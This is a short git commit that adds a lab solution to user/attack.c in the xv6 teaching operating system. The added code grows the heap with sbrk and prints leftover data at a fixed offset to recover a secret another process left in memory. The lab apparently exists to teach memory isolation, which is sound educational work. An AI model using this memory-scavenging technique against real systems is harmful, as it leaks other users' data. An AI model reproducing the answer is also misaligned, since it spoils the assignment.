fee8858daace930d1db654e9a89c94876585c8f8
HatCun <142104320+gr32ey20es@users.noreply.github.com>
2025-02-26 04:27:49 +0700

    Attack xv6

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,11 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
+  
+  char *end;
 
+  end = sbrk(PGSIZE*40);
+  fprintf (2, "%s", end + 16 * PGSIZE + 32);
+  
   exit(1);
 }
